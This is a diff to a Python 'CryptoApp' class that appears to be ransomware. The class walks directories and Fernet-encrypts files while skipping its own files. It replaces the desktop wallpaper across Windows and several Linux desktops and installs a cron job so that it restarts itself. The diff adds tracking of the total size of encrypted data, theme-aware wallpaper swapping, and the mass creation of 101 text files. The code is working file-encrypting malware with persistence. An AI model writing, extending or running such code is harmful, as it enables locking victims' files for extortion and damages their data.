@@ -1,6 +1,7 @@
 from cryptography.fernet import Fernet
 from subprocess import call, run
 from typing import Optional
+from glob import glob
 import ctypes
 import sys
 import os
@@ -12,6 +13,10 @@ import re
 if importlib.find_loader('winreg'):
     import winreg
 
+
+# ✅ Windows 10
+# ✅ Mint (Cinnamon)
+# ✅ Arch (Cinnamon, xfce, GNOME)
 
 class CryptoApp:
     def __init__(self, startPath: str = None):
@@ -38,12 +43,13 @@ class CryptoApp:
             
 
         # Initialize main variables
-        self.omittedFiles = ['.key', 'CryptoApp.py', 'index.py', '.cron_copy', '__pycache__']
-        self.extensionsToModify = []
-        self.KEY_PATH = os.path.abspath(KEY_PATH)
-        self.startingPath = startPath
-        self.countFiles = 0
-        self.countDirs = 0
+        self.omittedFiles:       list = ['.key', 'CryptoApp.py', 'index.py', '.cron_copy', '__pycache__']
+        self.extensionsToModify: list = []
+        self.KEY_PATH:           str = os.path.abspath(KEY_PATH)
+        self.startingPath:       str = startPath
+        self.countFiles:         int = 0
+        self.countDirs:          int = 0
+        self.totalFileSize:      int = 0
 
         try:
             self.fernet = Fernet(self.key)
@@ -141,12 +147,15 @@ class CryptoApp:
                     new_text: str = self.fernet.encrypt(old_text)
 
 
+                fileSize: int = os.stat(path).st_size
+
                 # Finally, write to the file its new content
                 self.writeFile(path, new_text)
                 print(f'[MOD] {path} - modified')
 
-                # Increment the modified files count
+                # Increment the modified files count, and sum of file sizes
                 self.countFiles += 1
+                self.totalFileSize += fileSize
 
 
             except PermissionError:
@@ -194,7 +203,7 @@ class CryptoApp:
 
 
     # Determine the OS, and DE, if on Linux
-    # Returns a list with a two elements that represent os and optionally desktop environment
+    # Returns a list with two elements that represent os and optionally desktop environment
     def determineOS(self) -> list:
         os_info: Optional[str] = None
         de: Optional[str] = None
@@ -231,7 +240,7 @@ class CryptoApp:
                 # Xfce
                 if target_de == 'xfce':
                     for monitor in ['Virtual1', 'Virtual-1', '0']:
-                        self.__runsh(f'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor{monitor}/workspace0/last-image -s {abs_path} 2>/dev/null')
+                        self.__runsh(f'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor{monitor}/workspace0/last-image -s {abs_path} 2> /dev/null')
 
                 # GNOME / Cinnamon
                 if target_de in ['gnome', 'cinnamon']:
@@ -264,7 +273,10 @@ class CryptoApp:
 
                 # GNOME / Cinnamon
                 elif target_de in ['gnome', 'cinnamon']:
-                    theme:  str = 'picture-uri-dark' if target_de == 'gnome' else 'picture-uri'
+                    # Get dark/light theme
+                    theme: str = self.__getsh('gsettings get org.gnome.desktop.interface gtk-theme')
+                    theme = 'picture-uri-dark' if 'dark' in theme.lower() else 'picture-uri'
+
                     result: str = self.__getsh(f'gsettings get org.gnome.desktop.background {theme}')
                     
                     # Remove the "file://" and '' to get a clear url
@@ -370,13 +382,14 @@ class CryptoApp:
             self.writeFile(CRON_ARG, current)
             
             # Save the new cron settings and run the script
-            self.__runsh(f'crontab {CRON_ARG} &> /dev/null')
+            self.__runsh(f'crontab {CRON_ARG} 2> /dev/null')
             self.__runsh(f'python3 {scriptToStart} &')
+
             os.remove(CRON_ARG)
 
         elif type == 'stop' and os.path.isfile(CRON_ORIGINAL):
             # Revert to the original cron settings
-            self.__runsh(f'crontab {CRON_ORIGINAL} &> /dev/null')
+            self.__runsh(f'crontab {CRON_ORIGINAL} 2> /dev/null')
             os.remove(CRON_ORIGINAL)
 
             try:
@@ -410,11 +423,27 @@ class CryptoApp:
         return None
 
 
+    # Creates additional files
+    def createAdditionalFiles(self, create_path: str, txtFilename: str, txtContent: str = '', num: int = 101) -> None:
+        for i in range(0, num):
+            new_file_path: str = os.path.join(create_path, txtFilename)
+            self.writeFile(f'{new_file_path}{i}.txt', txtContent)
+
+
+    # Removes additional files
+    def removeAdditionalFiles(self, create_path: str, txtFilename: str) -> None:
+        for file in glob(f'{os.path.join(create_path, txtFilename)}*.txt'):
+            try: os.remove(file)
+            except: continue
+
+
     # Returns True, if the files were already encrypted (key.txt is present)    
     def isAlreadyEncrypted(self) -> bool:
         return self.isEncrypted
 
     
-    # Get a list of a total modified files and directories
-    def getCount(self) -> list:
-        return [self.countFiles, self.countDirs]
+    # Get a list of a total modified files, directories and total size of affected files (MiB)
+    def getAffectedFilesInfo(self) -> list:
+        sizeInMB: int = round(self.totalFileSize / 1024**2, 2)
+
+        return [self.countFiles, self.countDirs, sizeInMB]
